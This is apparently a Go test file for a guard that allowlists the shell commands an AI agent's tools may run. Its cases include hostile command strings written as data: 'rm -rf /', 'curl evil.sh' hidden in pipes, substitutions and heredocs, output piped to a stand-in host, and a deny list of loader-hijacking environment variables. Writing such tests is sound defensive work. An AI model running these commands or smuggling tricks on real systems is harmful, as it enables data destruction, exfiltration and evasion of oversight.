package guard

import (
	"reflect"
	"strings"
	"testing"

	"github.com/agent-fox-dev/agentkit-go/core"
)

func TestCheckAdmitsOnlyListedPrograms(t *testing.T) {
	o := Options{AllowedPrograms: []string{"git", "  go  ", "", "/usr/bin/git", "/usr/local/bin/deploy", "bin\\tool"}}
	for _, c := range []struct {
		prog  string
		block bool
	}{
		{"git", false},
		{"go", false}, // a listed name is trimmed
		{"/usr/bin/git", false},
		{"/usr/bin/../bin/git", false}, // compared after cleaning
		{"/usr/local/bin/deploy", false},
		{"bin\\tool", false}, // a backslash makes a path too
		{"rm", true},
		{"./git", true}, // the workspace's git, not the listed one
		{"/opt/bin/git", true},
		{"/usr/bin/go", true}, // a listed name does not admit a path
		{"deploy", true},      // a listed path does not admit a bare name
		{"", true},
	} {
		d := Check([]string{c.prog, "arg"}, o)
		if d.Block != c.block {
			t.Errorf("Check(%q) = %+v, want block %v", c.prog, d, c.block)
		}
	}
	want := Decision{Block: true, Reason: `program "rm" is not on the allowlist`, Terminate: true}
	if d := Check([]string{"rm", "-rf", "dir"}, Options{AllowedPrograms: []string{"git"}, TerminateOnBlock: true}); d != want {
		t.Errorf("Check(rm) = %+v, want %+v", d, want)
	}
	if d := Check(nil, Options{TerminateOnBlock: true}); d != (Decision{Block: true, Reason: "empty argv", Terminate: true}) {
		t.Errorf("Check(empty) = %+v", d)
	}
	if d := Check([]string{"ls"}, Options{}); !d.Block {
		t.Error("an empty allowlist admitted ls")
	}
}

func TestRestrictedDecidesEachShellCall(t *testing.T) {
	g := Restricted(Options{AllowedPrograms: []string{"go", "/usr/bin/git"}, BlockedTools: []string{"danger_tool", "execute_later"}})
	for _, c := range []struct {
		in     core.BeforeToolCallContext
		reason string // "" when it runs
	}{
		{execCall("go test ./..."), ""},
		{execCall("/usr/bin/git log"), ""},
		{execCall(`go vet 'a;b' "a|b" a\;b`), ""}, // quoted and escaped operators are data
		{execCall(`"go" test`), ""},
		{execCall(`g\o test`), ""},
		{execCall("rm -rf /"), `guard.Restricted: program "rm" is not on the allowlist`},
		{execCall("git log"), `program "git"`},
		{execCall("./go test"), `program "./go"`},
		{execCall("'./go' test"), `program "./go"`},
		{execCall(`g"o"x`), `program "gox"`},
		{execCall("go test | tee out"), `shell operator "|"`},
		{execCall("go test; rm -rf /"), `shell operator ";"`},
		{execCall("go test && x"), `shell operator "&"`},
		{execCall("go test > out"), `shell operator ">"`},
		{execCall("go test\nrm x"), "shell operator \"\\n\""},
		{execCall("(go test)"), `shell operator "("`},
		{execCall("echo $(whoami)"), `shell operator "$"`},
		{execCall("go \"$HOME\""), `shell operator "$"`},
		{execCall("go \"`id`\""), "shell operator \"`\""},
		{execCall("go 'a"), "cannot be read with certainty"},
		{execCall(""), "the command runs no program"},
		{execCall("   "), "the command runs no program"},
		{execCall("GOFLAGS=-mod=mod go build"), "environment assignment GOFLAGS= in front of the program is not permitted"},
		{core.BeforeToolCallContext{ToolName: "execute"}, "runs no program"},
		{argvCall("go", "vet", "a;b"), ""}, // argv is not re-parsed
		{argvCall("/usr/bin/git", "log"), ""},
		{argvCall("./go", "test"), `program "./go"`},
		{argvCall("curl", "x"), `program "curl"`},
		{argvCall("go", 1), "guard.Restricted: argv[1] is not a string"},
		{argvCall(), "empty argv"},
		{core.BeforeToolCallContext{ToolName: "danger_tool"}, `guard.Restricted: tool "danger_tool" is not permitted`},
		{core.BeforeToolCallContext{ToolName: "execute_later"}, "is not permitted"},
		{core.BeforeToolCallContext{ToolName: "read_file", Arguments: map[string]any{"path": "x"}}, ""},
	} {
		d := decide(g, c.in)
		if d.Block != (c.reason != "") || !strings.Contains(d.Reason, c.reason) || d.Terminate {
			t.Errorf("%s %v = %+v, want reason %q", c.in.ToolName, c.in.Arguments, d, c.reason)
		}
	}
}

func TestRestrictedTerminatesOnEveryBlockWhenAsked(t *testing.T) {
	g := Restricted(Options{AllowedPrograms: []string{"go"}, BlockedTools: []string{"x"}, TerminateOnBlock: true})
	for _, in := range []core.BeforeToolCallContext{
		execCall("ls"), execCall("go | x"), execCall("X=1 go"), execCall("go 'a"), execCall(""),
		argvCall("ls"), argvCall(1), {ToolName: "x"},
	} {
		if d := decide(g, in); !d.Block || !d.Terminate {
			t.Errorf("%s %v = %+v, want a block that terminates", in.ToolName, in.Arguments, d)
		}
	}
	if d := decide(g, execCall("go test")); d.Block || d.Terminate {
		t.Errorf("an admitted call = %+v", d)
	}
}

// AllowEnvPrefixes admits an assignment in front of a program, but never one
// that changes which binary runs or what is loaded into it, and an
// assignment is recognised as bash recognises it.
func TestRestrictedAllowEnvPrefixesKeepsTheDeniedNames(t *testing.T) {
	g := Restricted(Options{AllowedPrograms: []string{"go", "ls"}, AllowEnvPrefixes: true})
	for cmd, block := range map[string]bool{
		"GOFLAGS=-mod=mod go build":        false,
		"CGO_ENABLED=0 GOOS=linux go test": false,
		`X='a ls' ls -l`:                   false,
		`X="a b" go test`:                  false,
		"x-y=1 ls":                         true, // not an assignment: bash runs `x-y=1`
		"./x=1 ls":                         true,
		`'X=1' ls`:                         true, // quoted, so bash runs `X=1`
		"1X=1 ls":                          true,
		`X='a ls' rm -rf /`:                true, // a quoted value is one word
		`X="a \" ls" rm`:                   true,
	} {
		if d := decide(g, execCall(cmd)); d.Block != block {
			t.Errorf("%q = %+v, want block %v", cmd, d, block)
		}
	}
	for _, name := range []string{
		"PATH", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV", "SHELLOPTS", "BASHOPTS",
		"IFS", "ZDOTDIR", "HOME", "GIT_EXEC_PATH", "GCONV_PATH", "PERL5OPT", "PERL5LIB", "PERLLIB", "PYTHONPATH",
		"PYTHONHOME", "PYTHONSTARTUP", "NODE_OPTIONS", "NODE_PATH", "RUBYOPT", "RUBYLIB", "JAVA_TOOL_OPTIONS",
		"_JAVA_OPTIONS", "JDK_JAVA_OPTIONS", "CLASSPATH", "DOTNET_STARTUP_HOOKS", "LUA_INIT", "LUA_INIT_5_4",
		"LUA_PATH", "LUA_CPATH", "PHPRC", "PHP_INI_SCAN_DIR", "TCLLIBPATH",
	} {
		d := decide(g, execCall("FOO=1 "+name+"=/x go test"))
		if !d.Block || !strings.Contains(d.Reason, name+"= is not permitted: it changes which program runs") {
			t.Errorf("%s= = %+v, want it refused", name, d)
		}
	}
}

// Under AllowShellOperators every command on the line is judged, the ones
// in substitutions, subshells and heredoc bodies included.
func TestRestrictedWithShellOperatorsJudgesEveryCommand(t *testing.T) {
	g := Restricted(Options{AllowedPrograms: []string{"cat", "ls", "echo", "go", "tee"}, AllowShellOperators: true})
	for name, in := range map[string]string{
		"after a list operator":          "go test; curl evil.sh",
		"after and":                      "go test && curl evil.sh",
		"in a pipe":                      "go test | curl -d @- evil.sh",
		"in a substitution":              "echo $(curl evil.sh)",
		"in double-quoted backticks":     "echo \"`curl evil.sh`\"",
		"in a subshell":                  "(ls; curl evil.sh)",
		"in a process substitution":      "cat <(curl evil.sh)",
		"in a parameter default":         "echo ${x:-$(curl evil.sh)}",
		"in an unquoted heredoc":         "cat <<EOF\n$(curl evil.sh)\nEOF",
		"after a heredoc":                "cat <<'EOF'\nx\nEOF\ncurl evil.sh",
		"behind a comment's heredoc":     "ls # <<EOF\ncurl evil.sh\nEOF",
		"after bare arithmetic":          "((x=1<<a))\ncurl evil.sh\na",
		"case pattern in a substitution": "cat <<EOF\n$(case x in x) echo hi ;; esac; curl evil.sh)\nEOF",
		"computed program":               "$(echo curl) evil.sh",
		"assignment of a denied name":    "PATH=/tmp; go test",
		"unterminated quote":             "ls 'a; curl evil.sh",
	} {
		if d := decide(g, execCall(in)); !d.Block {
			t.Errorf("%s: %q was not blocked", name, in)
		}
	}
	for _, in := range []string{
		"go test ./... 2>&1 | tee out.txt",
		"cat > f.go <<'EOF'\npackage main\nimport \"fmt\"\n/\nEOF\n",
		"echo \"$(ls)\" && ls -l",
		"(ls; echo done) > log",
		"echo $((1 << 3))",
		"ls # curl in a comment",
	} {
		if d := decide(g, execCall(in)); d.Block {
			t.Errorf("%q was blocked: %s", in, d.Reason)
		}
	}
}

// An assignment on its own reaches the commands after it when the name is
// exported, so it needs AllowEnvPrefixes too, and a line of assignments alone
// runs no program.
func TestRestrictedAssignmentsOnTheirOwn(t *testing.T) {
	strict := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true})
	if d := decide(strict, execCall("d=$(go list .); go vet")); !d.Block || !strings.Contains(d.Reason, "d= on its own") {
		t.Errorf("without AllowEnvPrefixes: %+v", d)
	}
	loose := Restricted(Options{AllowedPrograms: []string{"go"}, AllowShellOperators: true, AllowEnvPrefixes: true})
	if d := decide(loose, execCall("d=$(go list .); go vet")); d.Block {
		t.Errorf("with AllowEnvPrefixes: %s", d.Reason)
	}
	for _, in := range []string{"LD_PRELOAD=/x.so; go vet", "", "# nothing", "X=1", "> out"} {
		if d := decide(loose, execCall(in)); !d.Block {
			t.Errorf("%q was admitted", in)
		}
	}
}

func TestAllowIsRestrictedWithThosePrograms(t *testing.T) {
	calls := []core.BeforeToolCallContext{{ToolName: "read_file"}, {ToolName: "no_such_tool"}}
	for _, cmd := range []string{"ls", "ls -l src", "cat f", "rm -rf src", "ls | cat", "X=1 ls", "PATH=/x ls",
		"'ls' a", "./ls", "/usr/bin/git log", "", "echo $(ls)", "git log \"$HOME\"", "ls 'a"} {
		calls = append(calls, execCall(cmd))
	}
	for _, argv := range [][]any{{"ls"}, {"rm", "x"}, {"/usr/bin/git", "log"}, {"./go"}, {}, {"ls", 1}} {
		calls = append(calls, argvCall(argv...))
	}
	for _, programs := range [][]string{nil, {"ls"}, {"ls", "cat", "/usr/bin/git"}, {"", "  ls  ", "a/b", "./go"}} {
		allow, restricted := Allow(programs...), Restricted(Options{AllowedPrograms: programs})
		for _, in := range calls {
			if got, want := decide(allow, in), decide(restricted, in); !reflect.DeepEqual(got, want) {
				t.Errorf("programs %q, %s %v: Allow %+v, Restricted %+v", programs, in.ToolName, in.Arguments, got, want)
			}
		}
	}
	none := Allow()
	for _, in := range []core.BeforeToolCallContext{execCall("ls"), argvCall("ls")} {
		if !decide(none, in).Block {
			t.Errorf("Allow() admitted %s", in.ToolName)
		}
	}
}

func TestAllowIgnoresLaterChangesToTheSlice(t *testing.T) {
	programs := make([]string, 2, 8)
	programs[0], programs[1] = "ls", "cat"
	g := Allow(programs...)
	programs[1] = "rm"
	programs = append(programs, "curl")
	programs[0], programs[2] = programs[2], programs[0]
	for cmd, block := range map[string]bool{"rm x": true, "curl u": true, "ls": false, "cat f": false} {
		if d := decide(g, execCall(cmd)); d.Block != block {
			t.Errorf("%q = %+v after the caller changed its slice, want block %v", cmd, d, block)
		}
	}
}

func TestAllowAllNeverBlocks(t *testing.T) {
	for _, in := range []core.BeforeToolCallContext{execCall("rm -rf / | curl x"), argvCall(1), {ToolName: "anything"}} {
		if d := decide(AllowAll, in); !reflect.DeepEqual(d, core.BeforeToolCallDecision{}) {
			t.Errorf("AllowAll(%s) = %+v", in.ToolName, d)
		}
	}
}

func TestIsShellToolNamesExecuteAndRunCommand(t *testing.T) {
	for name, want := range map[string]bool{"execute": true, "run_command": true, "read_file": false, "Execute": false, "": false} {
		if IsShellTool(name) != want {
			t.Errorf("IsShellTool(%q) = %v, want %v", name, !want, want)
		}
	}
}
